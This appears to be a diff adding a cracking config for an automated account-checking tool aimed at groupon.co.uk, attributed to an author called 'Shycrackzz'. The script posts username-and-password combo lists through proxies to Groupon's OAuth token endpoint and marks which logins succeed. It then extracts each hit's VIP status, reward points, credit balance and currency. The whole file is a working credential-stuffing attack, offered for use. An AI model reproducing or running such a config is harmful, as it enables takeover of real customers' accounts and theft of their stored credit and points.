@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "groupon.co.uk",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-01T21:10:06.7647308+01:00",
+  "AdditionalInfo": "",
+  "Author": "Shycrackzz",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#URL1 REQUEST POST "https://api.groupon.de/api/mobile/UK/oauth/access_token?" 
+  CONTENT "show=default&client_id=2960e238e4d7025db19d936e77461714&clien?t_version_id=18.9.154317&referrer=&password=<PASS>&grant_type=password&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"user\":{" 
+  KEYCHAIN Failure OR 
+    KEY "User credentials are invalid" 
+#isVIP PARSE "<SOURCE>" LR "isVip\":" "}" -> VAR "isVIP" 
+#RewardPointsAvailable PARSE "<SOURCE>" LR "rewardPointsAvailable\":" "," -> VAR "RewardPointsAvailable" 
+#Status PARSE "<SOURCE>" LR "status\":\"" "\"" -> VAR "Status" 
+#CreditsAvailable PARSE "<SOURCE>" LR "creditsAvailable\":{\"amount\":" "," -> VAR "CreditsAvailable" 
+#CurrencyCode PARSE "<SOURCE>" LR "currencyCode\":\"" "\"" -> VAR "CurrencyCode" 
